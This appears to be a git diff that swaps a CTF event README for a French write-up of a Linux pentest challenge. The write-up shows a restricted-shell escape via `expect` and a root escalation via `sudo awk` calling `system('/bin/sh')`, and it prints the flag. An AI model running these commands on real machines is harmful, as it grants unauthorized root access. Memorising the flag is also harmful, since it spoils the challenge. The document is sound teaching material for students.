@@ -1,101 +1,105 @@
-<div align="center">
-    <h1>24h IUT 2025</h1>
-    <a href="https://discord.com/channels/1333366010232705097/1333366010753056831"><img src="https://img.shields.io/badge/discord-24hiut25-5865F2?style=for-the-badge&logo=discord"></a>
-    <!--<a href=""><img src="https://img.shields.io/github/license/ctfer-io/24hiut2025?style=for-the-badge" alt="License"></a>-->
-    <a href="https://github.com/ctfer-io/24hiut2025/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-apache--2.0-green?style=for-the-badge"></a>
-</div>
 
-This repository contains the challenges and infrastructure elements for the [24h IUT 2025](https://24hinfo.iut.fr/).
 
-> [!WARNING]
-> This repository is a Work In Progress (CI, filesystem architecture, challenges). It is subject to major changes.
->
-> In case of any non-retrocompatible or other breaking changes, [PandatiX](https://github.com/pandatix) will inform the relevant parties.
+# L'illusionniste
 
-## Challenges
+### Categorie
 
-| Category | Name | Difficulty | Status |
-|---|---|---|---|
+Pentest système
+### Description
 
-### Team
+Trouvez votre chemin vers la liberté, puis élevez-vous au-delà des restrictions.
+Le flag vous attend dans la demeure de celui qui contrôle tout, au sommet de ces lieux.
 
-- Admin
-  - [PandatiX](https://github.com/pandatix)
-  - [NicoFgrx](https://github.com/NicoFgrx)
-  - WildPasta
-- Ops
-  - PandatiX
-  - NicoFgrx
-  - WildPasta
-- ChallMaker
-  - PandatiX (Infra)
-  - NicoFgrx (Network)
-  - WildPasta (?)
-  - KlemouLeZoZo (Windows)
-  - d07pwn3d (OSINT)
-  - hashp4 (Threat Hunting)
-  - Rallonge-sensi (Reverse)
-  - Souehda (Pwn)
-  - juju665937 (Multi Agent Systems)
-  - FireFlan (?)
+Credentials: `user:password`
 
-### Classification
+Format : **24HIUT{flag}**
+Auteur : **Fr4gments**
 
-Flag format: `24HIUT{...}`
+### Write Up
 
-Scoring:
-- Score: **500** per challenge, **50** per side quest
-- Decay: **15**
-- Minimum: **50**
+Nous arrivons sur le chall avec un message d'acceuil pour le moins étrange:
+```
+=======================================================================================================
+Bienvenue dans le défi "L'Illusionniste" !
 
-Difficulties:
-- **Easy**: introduction level, everyone should be able to complete under 2 hours (with hints)
-- **Medium**: require some knowledges, potentially acquired during the event with previous challenges
-- **Hard**: require previous knowledges and creativity to solve
-- **Legendary**: require complex skills (might not be solved under 8 hours)
+Un magicien ne révèle jamais ses secrets, mais parfois les scripts révèlent plus qu'ils ne devraient.
+Quelque chose vous attend sur cette machine, caché derrière des couches d'automatisation.
 
-> [!NOTE]
-> The 24h IUT 2025 targets BAC+1 to BAC+3 students, with mostly no previous experience in the field of cybersecurity.
-> The event start at friday 2PM, then 8 hours of algorithmic challenges, 8 hours of web development, and 8 hours for the CTF (saturday 6AM-2PM).
->
-> This must be considered in the difficulty rating by the ChallMaker. If any question, please contact Admins.
+Les outils sont souvent plus puissants qu'ils n'y paraissent, et certains langages peuvent faire bien plus que leur fonction première...
 
-Status:
-- **Incoming**
-- **Review**
-- **Ready**
+Trouvez votre chemin vers la liberté, puis élevez-vous au-delà des restrictions.
+Le flag vous attend dans la demeure de celui qui contrôle tout, au sommet de ces lieux.
 
-### How to add a challenge ?
+Bonne chance !
+======================================================================================================
+```
 
-1. Clone the repository.
-    ```bash
-    git clone git@github.com:ctfer-io/24hiut2025.git && cd "$(basename "$_" .git)"
-    ```
+On remarque très vite que nous sommes dans un shell restreint:
+```
+$ cd ../  
+bash: cd: restricted
+```
 
-2. Create the directory for your challenge.
-    ```bash
-    mkdir -p challenges/<category>/<name> && cd $_
-    ```
+Les commandes usuelles de Linux ne fonctionnenent pas, excepté `ls` et quelques autres:
+```
+$ ls $PATH
+cat cp dircolors expect less ls more nano rbash
+```
 
-3. Create your challenge configuration file.
-    ```bash
-    touch challenge.yaml
-    ```
-    You can add the schema to trigger auto-completion for ease of completion :wink:
-    ```bash
-    echo "# yaml-language-server: \$schema=file://$(cd ../../.. && pwd)/schema.json" > challenge.yaml
-    ```
+On a accès aux quelques binaires du répertoire /usr/local/rbin. `less` et `more` semblent être prometteurs s'échapper du shell, toutefois, toutes tentatives resteront infructueuses. 
 
-4. If your challenges require files to give players, create the `dist` directory.
-    ```bash
-    mkdir dist
-    ```
+Dans le message d'accueil, on peut y lire:
+```
+Quelque chose vous attend sur cette machine, caché derrière des couches d'automatisation.
+```
 
-5. If your challenge require infrastructure, create the `infra` directory.
-    ```bash
-    mkdir infra
-    ```
-    In case your challenge deploys challenges on demand, add the `Dockerfile`s such that we could rebuild the challenges.
-    More on this topic will come later.
+Parmi les binaires disponibles, on y trouve `expect` qui sert à automatiser des intéractions avec des programmes intéractifs (SSH, FTP etc...).
+Si on s'en refère à [GTFOBins](https://gtfobins.github.io/gtfobins/expect/) on peut s'évader du shell restreint avec `expect`:
+```
+$ expect -c 'spawn /bin/sh;interact'
+```
 
-6. Submit your challenge through a [Pull Request](https://github.com/ctfer-io/24hiut2025/compare/main?template=challenge_pr.md).
+À ce stade, on se retrouve hors du shell restreint, on a donc accès à beaucoup plus de choses. Notamment au binaire `sudo`. On en profite pour vérifer nos droits sur la machine:
+```
+$ /bin/sudo -l
+User user may run the following commands on this machine:
+(root) NOPASSWD: /bin/awk
+```
+
+Si on se remémore de la deuxième partie du message d'accueil:
+```
+Les outils sont souvent plus puissants qu'ils n'y paraissent, et certains langages peuvent faire bien plus que leur fonction première...
+```
+
+``awk`` étant un langage de programmation... On jette un nouveau coup d'oeil à  [GTFOBins](https://gtfobins.github.io/gtfobins/awk/), on apprend que l'on peut créer un nouveau shell avec awk:
+```
+awk 'BEGIN {system("/bin/sh")}'
+```
+
+Toutefois, ouvrir un nouveau shell avec awk sans droits supplémentaires nous servirait à rien, on va alors le faire avec sudo:
+```
+$ /bin/sudo /bin/awk 'BEGIN {system("/bin/sh")}'
+```
+
+Nous sommes maintenant ``root`` sur la machine:
+```
+# whoami
+root
+```
+
+En se basant sur la dernière partie du message d'accueil:
+```
+Le flag vous attend dans la demeure de celui qui contrôle tout, au sommet de ces lieux.
+```
+
+Rendons nous dans le répertoire ``/root`` et lisons le flag:
+```
+# cat flag.txt
+24HIUT{3XP3C7_7H3_35C4P3_4WK_Y0UR_W4Y_UP}
+```
+
+Félicitations !
+
+### Flag
+
+24HIUT{3XP3C7_7H3_35C4P3_4WK_Y0UR_W4Y_UP}
